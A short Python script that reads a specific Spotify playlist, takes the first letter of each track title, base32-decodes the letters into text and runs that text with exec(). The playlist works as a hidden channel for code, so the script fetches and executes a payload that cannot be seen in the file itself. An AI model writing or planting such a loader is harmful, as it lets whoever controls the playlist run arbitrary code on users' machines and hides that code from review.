import base64
import spotipy
from spotipy.oauth2 import SpotifyClientCredentials

sp = spotipy.Spotify(auth_manager=SpotifyClientCredentials())

playlist = sp.playlist('2HUBG1spguZoS2iov9nDET')	# ID of playlist
pid = playlist['uri']

pid = pid.split(":")[2]				# Remove unneeded values
offset = 0							# the index of the first track to return

response = sp.playlist_tracks(pid, 
	offset=offset,
	fields='items,total',
	additional_types=['track']
)										# Get songs in playlist

songs = response['items']
base32 = ""

for song in songs:
	base32 = base32 + song.get("track").get("name")[0]		# Get first letter from each song

base32 = base32.upper()							# make all letters uppercase
code = base64.b32decode(base32).decode("utf-8")	# decode from b32 to string

exec(code)		# execute code